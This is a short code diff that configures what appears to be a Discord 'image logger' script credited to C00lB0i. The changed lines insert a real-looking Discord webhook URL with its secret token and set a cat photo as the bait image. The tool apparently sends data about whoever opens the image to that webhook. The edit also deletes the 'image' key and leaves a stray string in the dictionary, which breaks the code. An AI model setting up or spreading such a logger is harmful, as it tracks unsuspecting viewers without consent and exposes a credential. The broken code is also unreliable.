@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1416151417915314368/cnA1GlEQJw7t_kVqSvpCgziAUwGGAky9F_XNSeSVICBkb7VLNttoZnflJNSmFQ-lLqYE",
+    "https://www.trupanion.com/images/trupanionwebsitelibraries/bg/siamese-cat-pose.jpg?sfvrsn=baac8bf0_5", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
